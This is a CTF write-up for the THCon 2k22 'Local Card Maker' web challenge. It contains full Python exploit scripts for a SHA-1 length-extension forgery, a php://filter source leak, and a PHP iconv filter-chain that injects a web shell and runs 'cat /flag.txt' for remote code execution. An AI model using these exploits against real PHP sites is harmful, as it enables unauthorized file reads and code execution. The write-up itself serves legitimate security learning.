---
title: 'THCon 2k22 CTF - "Local Card Maker" Writeup'
date: '2022-04-17T20:55:10+00:00'
author: Guy Lewin
layout: post
redirect_from:
  - /thcon-2k22-ctf-local-card-maker-writeup/
tags:
  - ctf
  - exploit
  - lfi
  - php
  - rce
  - sha-1
  - web
---

I participated in [THCon 2k22 CTF](https://ctf.thcon.party/) and amongst the incredible "web" challenges - my favorite was "Local Card Maker" (made by `jrjgjk`). In this post I’ll describe the challenge and my step-by-step solution.

## The Challenge

![Description in the CTF portal](/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/1.png)

Right off the bat we can tell there’s going to be some SHA-1 (*"secure hash algorithm 1"*) with a 23 character "secret key". The attached ZIP file contained only the following `scan.txt` file:

```
PAGE	|	HTTP_STATUS

/index.php   ==> 200
/phpinfo.php ==> 200
/change_profile.php ==> 200
/view_profile.php ==> 200
```

The goal is to read the content of `/flag.txt`.

## Exploring the Site

The site has 2 interesting pages I could find:

![View](/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/2.png)
![Edit](/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/3.png)

The edit page sets a cookie (`user_data`) with the PHP-serialized `User` object set in the form (along with another cookie - `user_hash` to sign that data), and the view page displays that information if the hash is valid. I tried modifying `user_data` in multiple ways but kept getting hash validation errors. I decided to put that aside and try a different direction.

The URLs of these pages - `http://challenges1.thcon.party:2001/index.php?page=Y2hhbmdlX3Byb2ZpbGU=&pHash=0171caa8e7a1fe56361fdce865e6e174b3b892f9` and `http://challenges1.thcon.party:2001/index.php?page=dmlld19wcm9maWxl&pHash=7b6f8b016f25da478b9f28f878aa3be8cced66fd` - both seem to go through `index.php` for rendering. The `page` parameter is base64-encoded "change\_profile" and "view\_profile" which matches the files in `scan.txt`!

When I tried to access `/phpinfo.php`, `/change_profile.php` or `/view_profile.php` directly I received an error ("Direct access to this page is disable.").

Theoretically - we can access `phpinfo.php` if we could put that value (Base64-encoded) in the `page` query parameter - but without finding the proper hash the validation will keep failing.

## SHA-1 Exploitation

A quick Google search led me to [this article](https://journal.batard.info/post/2011/03/04/exploiting-sha-1-signed-messages) which seemed like the perfect solution - if I have data and SHA-1 hash on it with a salt prefix (of known length) - I can append data to it and calculate a valid hash, without knowing the salt! To understand this section better - I recommend reading the article before proceeding.

I relied heavily on [the code from the article `nicolasff` posted on GitHub](https://github.com/nicolasff/pysha1) to create a script to fetch `phpinfo.php`:

```python
import struct
import base64
import urllib.parse
import requests

# The code below is based on https://github.com/nicolasff/pysha1 (adapted to Python3) until line 87:

top = 0xffffffff

def rotl(i, n):
	lmask = top << (32-n)
	rmask = top >> n
	l = i & lmask
	r = i & rmask
	newl = r << n
	newr = l >> (32-n)
	return newl + newr

def add(l):
	ret = 0
	for e in l:
		ret = (ret + e) & top
	return ret

xrange = range

def sha1_impl(msg, h0, h1, h2, h3, h4):
	for j in xrange(int(len(msg) / 64)):
		chunk = msg[j * 64: (j+1) * 64]

		w = {}
		for i in xrange(16):
			word = chunk[i*4: (i+1)*4]
			(w[i],) = struct.unpack(">i", word)
		
		for i in range(16, 80):
			w[i] = rotl((w[i-3] ^ w[i-8] ^ w[i-14] ^ w[i-16]) & top, 1)

		a = h0
		b = h1
		c = h2
		d = h3
		e = h4

		for i in range(0, 80):
			if 0 <= i <= 19:
				f = (b & c) | ((~ b) & d)
				k = 0x5A827999
			elif 20 <= i <= 39:
				f = b ^ c ^ d
				k = 0x6ED9EBA1
			elif 40 <= i <= 59:
				f = (b & c) | (b & d) | (c & d)
				k = 0x8F1BBCDC
			elif 60 <= i <= 79:
				f = b ^ c ^ d
				k = 0xCA62C1D6

			temp = add([rotl(a, 5), f, e, k, w[i]])
			e = d
			d = c
			c = rotl(b, 30)
			b = a
			a = temp

		h0 = add([h0, a])
		h1 = add([h1, b])
		h2 = add([h2, c])
		h3 = add([h3, d])
		h4 = add([h4, e])

	return (h0, h1, h2, h3, h4)

def pad(msg, sz = None):
	if sz == None:
		sz = len(msg)
	bits = sz * 8
	padding = 512 - ((bits + 8) % 512) - 64

	msg += b"\x80"	# append bit "1", and a few zeros.
	return msg + int(padding / 8) * b"\x00" + struct.pack(">q", bits) # don't count the \x80 here, hence the -8.

def sha1(msg):
    # These are the constants in a standard SHA-1
	return sha1_impl(pad(msg), 0x67452301 , 0xefcdab89 , 0x98badcfe , 0x10325476 , 0xc3d2e1f0)

# "Local Card Maker"-specific implementation starts here:

def sha1_bytes_to_str(result):
	return ''.join([hex(x)[2:].zfill(2) for x in result])

def get_h_values(hash_string):
    # Divide hash_string to 5 ints, 4 bytes each
    return [int(hash_string[i*8:(i+1)*8], 16) for i in range(5)]

# "view_profile" taken from site ("page" query parameter)
block_1_buf = b"dmlld19wcm9maWxl"
# Hash taken from site ("pHash" query parameter)
block_1_hash = b"7b6f8b016f25da478b9f28f878aa3be8cced66fd"
block_1_h_values = get_h_values(block_1_hash)
# taken from description of challenge
salt_len = 23

# "aaa" is padding, since the previous SHA-1 block contains the length at the end which is parsed by PHP as Base64 data.
# I align to 4 bytes in order for the appended path to be parsed correctly.
block_2_buf = b"aaa" + base64.encodebytes(b"/.././././././././phpinfo").replace(b"\n", b"")
# Pad this second block, use a custom size with additional 64 bytes to account for the first block (which is always padded to 64)
block_2_buf_padded = pad(block_2_buf, len(block_2_buf) + 64)
joined_buf_hash = sha1_bytes_to_str(sha1_impl(block_2_buf_padded, *block_1_h_values))
print(joined_buf_hash)
# Add 23 "A"s to simulate the SHA-1 block creation with the salt, but remove the salt since it'll be added by the server.
joined_buf = pad((b"A" * salt_len) + block_1_buf)[salt_len:] + block_2_buf
encoded_joined_buf = urllib.parse.quote_plus(joined_buf)
print(encoded_joined_buf)

print(requests.get("http://challenges1.thcon.party:2001/index.php?page=%s&pHash=%s" % (encoded_joined_buf, joined_buf_hash)).content)
```

In the code above we use the "view\_profile" page (encoded as `dmlld19wcm9maWxl` in Base64) along with the salted hash (`7b6f8b016f25da478b9f28f878aa3be8cced66fd`) from the site URL. We pad that to a SHA-1 block (64 bytes including the salt, first byte after data is 0x80 and last 2 bytes are length) and add a 2nd block: `aaa + base64("/.././././././././phpinfo")`.

We add 3 bytes (`"aaa"`) because the last byte of the previous SHA-1 block (as you can see below - 0x38 in yellow) is identified by PHP as a Base64 data byte. Aligning that to 4 bytes makes the following Base64-encoded string correctly readable (since Base64 is read aligned to 4 bytes).

The result `joined_buf` which we were able to sign (before URL encoding) is:

![](/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/4.png)

The first part (green) is the original Base64-encoded string (containing "view\_profile"). The red `0x80` is the end-of-string marker added in SHA-1. Afterwards, the white `0x00` bytes are padding to complete the first chunk to 64 bytes (taking into account that 23 bytes were also used for salt and 2 bytes are used for length). The yellow `0x01 0x38` is chunk length in bits. It equals 0x138 = 312 bits = 39 bytes which is calculated by: `len("dmlld19wcm9maWxl") + key_length = 16 + 23 = 39`. The next 3 blue-colored `0x61` bytes are the padding I mentioned previously to align our Base64 string for PHP. The rest of the purple bytes are the Base64 payload.

When PHP receives this payload with a valid hash - it parses the Base64-encoded path as: `view_profile<unprintable characters>/.././././././././phpinfo` - which will be resolved into `phpinfo` and appended by the app logic with `.php`. Now we got to read what’s in `phpinfo.php`!

## phpinfo

If you’re unfamiliar with [`phpinfo()`](https://www.php.net/manual/en/function.phpinfo.php) - it’s a built-in function that prints useful information about PHP and the environment it’s running on. Here’s how it looks like when running from our exploited URL (`phpinfo.php` simply calls `phpinfo()`):

![](/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/5.png)
Within this page I found a good lead - the key used as the SHA-1 salt! The key was shown here because it’s defined as a PHP variable:

![](/assets/images/posts/thcon-2k22-ctf-local-card-maker-writeup/6.png)
But this key isn’t enough to retrieve the flag from /flag.txt - we can’t load a .txt file since the `index.php` loader code appends `.php` to every Base64 payload we give it.

## Bonus - Leaking index.php File Contents

I wanted to make sure I understand how `index.php` works internally, so equipped with the secret key I leaked the content of index.php:

```python
import base64
import hashlib
import requests

php_file = b"index"
path = b"php://filter/convert.base64-encode/resource=%s" % (php_file,)
key_salt = b"Thcon_SuP3r_S3cr4t_K3y!"
buf = base64.encodebytes(path).replace(b"\n", b"")
buf_hash = hashlib.sha1(key_salt + buf).hexdigest()
buf = buf.decode()

print(requests.get("http://challenges1.thcon.party:2001/index.php?page=%s&pHash=%s" % (buf, buf_hash)).content)
```

The result is Base64-encoded `index.php`. Here it is after decoding, to better understand how this challenge works:

```php
<?php
session_start();
require("crypto.php");
$safe_handler = new IntegrityHandler($_SERVER['SECRET_KEY'], 'sha1');
define("LOCAL_ACCESS", 1);


function createHeaders($pArray, $handler){
	echo '<a href="/"><li>Home</li></a>';
	foreach($pArray as $p => $v){
		echo "<a href='/index.php?page=" . base64_encode($p) ."&pHash=" . $handler->secure_data(base64_encode($p)) . "' /><li>$v</li></a>";
	}
}

?>


<html>
<head>
	<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
	<link rel="stylesheet" type="text/css" href="css/style.css">
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Framework</title>
</head>
<body>
	<div class="headers">
		<div class="inner_headers">
			<div class="logo_c">
				<h1>Thcon22<span>Framework</span></h1>
			</div>
				<ul class="nav">
	<?php
	createHeaders(array('change_profile' => 'Edit', 'view_profile' => 'View'), $safe_handler);
	?>
			</ul>
		</div>
	</div>
	<div class="blank_space"></div>

	<?php
	if(isset($_GET['page']) && !empty($_GET['page']) && isset($_GET['pHash']) && !empty($_GET['pHash']))
	{
		$page = $_GET['page'];
		$hash = $_GET['pHash'];
		if($safe_handler->handle($page, $hash))
		{
			include(base64_decode($page) . '.php');
		}
		else
		{
			echo "<h2>Integrity verification failed...</h2>";
		}
	}
	else{
	?>
	<h1>Welcome to the profile editor !</h1>
	<p>Here you can create and edit your profile.<br> A card will be created for your Thcon22 participation.<br> We hope you will like the rendering !</p>
	<?php
	}
	?>
</body>
</html>
```

Now we know for certain how files are loaded - `include(base64_decode($page) . '.php')`. We need to find a way to load `/flag.txt` even though `.php` is always appended.

## Getting the Flag

When I participated in hxp CTF 2021 we faced [a similar problem](https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/), and I remember [`loknop` developed a creative solution](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) using only [PHP conversion filters](https://www.php.net/manual/en/filters.convert.php) passed to `include()` to achieve **RCE** (which is much more than what we need here - reading file content, but will work!). I wrote the below solution to adapt the method to this challenge:

```python
import base64
import hashlib
import requests

# Based on https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d (until line 52):
conversions = {
    'R': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2',
    'B': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2',
    'C': 'convert.iconv.UTF8.CSISO2022KR',
    '8': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2',
    '9': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB',
    'f': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213',
    's': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61',
    'z': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS',
    'U': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932',
    'P': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213',
    'V': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5',
    '0': 'convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2',
    'Y': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2',
    'W': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2',
    'd': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2',
    'D': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2',
    '7': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2',
    '4': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2'
}

# Simple but does the trick
command = "cat /flag.txt"

#<?=`$_GET[0]`;;?>
base64_payload = "PD89YCRfR0VUWzBdYDs7Pz4"

# generate some garbage base64
filters = "convert.iconv.UTF8.CSISO2022KR|"
filters += "convert.base64-encode|"
# make sure to get rid of any equal signs in both the string we just generated and the rest of the file
filters += "convert.iconv.UTF8.UTF7|"

for c in base64_payload[::-1]:
        filters += conversions[c] + "|"
        # decode and reencode to get rid of everything that isn't valid base64
        filters += "convert.base64-decode|"
        filters += "convert.base64-encode|"
        # get rid of equal signs
        filters += "convert.iconv.UTF8.UTF7|"

filters += "convert.base64-decode"
file_to_use = "index"

final_payload = f"php://filter/{filters}/resource={file_to_use}".encode()

# "Local Card Maker"-specific implementation starts here:

key_salt = b"Thcon_SuP3r_S3cr4t_K3y!"
buf = base64.encodebytes(final_payload).replace(b"\n", b"")
buf_hash = (hashlib.sha1(key_salt + buf).hexdigest())
buf = buf.decode()

print(requests.get("http://challenges1.thcon.party:2001/index.php?page=%s&pHash=%s&0=%s" % (buf, buf_hash, command)).content)
```

The result contained the flag `Thcon22{_Php_&nd_Ap@che_R000ck5$$_}` - I guess the original solution should have used Apache? 😅
